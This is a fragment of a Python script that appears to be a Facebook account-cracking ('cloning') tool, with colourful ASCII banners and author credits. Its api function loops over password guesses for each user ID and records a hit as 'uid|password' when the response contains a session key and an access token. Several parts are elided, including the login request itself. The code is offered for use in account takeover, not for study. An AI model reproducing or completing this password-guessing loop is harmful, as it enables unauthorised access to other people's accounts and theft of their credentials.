...
\033[1;96m   ████   ███████ ██   ██ ██      ██ ██   ██   
     ...
     _____________________________________________________________________________________|
      ...
      [ Facebook  : LIBYA-1982
      [ YouTube   : AQA
      [ POWER BY  : \x1b[1;32mOSᗩᗰᗩ\x1b[1;97m             
    _____________________________________________________________________________________|033[1;92m""")
        ...
        print("\033[92;1m      AUTHOR : OSᗩᗰᗩ-ZᗩᗰZᗩᗰ      ")
        print("\033[97;1m  ________________________________________________________________________________________")
    ...
    def email(self):
        x = 111
        xx = 999
        nam = input("%s [?] TYPE A NAME %s(EX:ZᗩᗰZᗩᗰ ", " OSAMA ): " % (Y, G))
        nam = nam.replace(" ", "")
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write(
            "\r\r %s\033[0;93m[OSᗩᗰᗩ-CLONING : \033[0;97m %s/%s -> \033[0;92m [OK-ID:%s ]- \033[0;93m[CP-ID:%s ]" % (
            B, self.loop, len(self.id), len(self.ok), len(self.cp))
        );
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ...
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r \033[0;92m[OSᗩᗰᗩ -OK-ID] %s|%s\033[0;97m         " % (uid, pw))
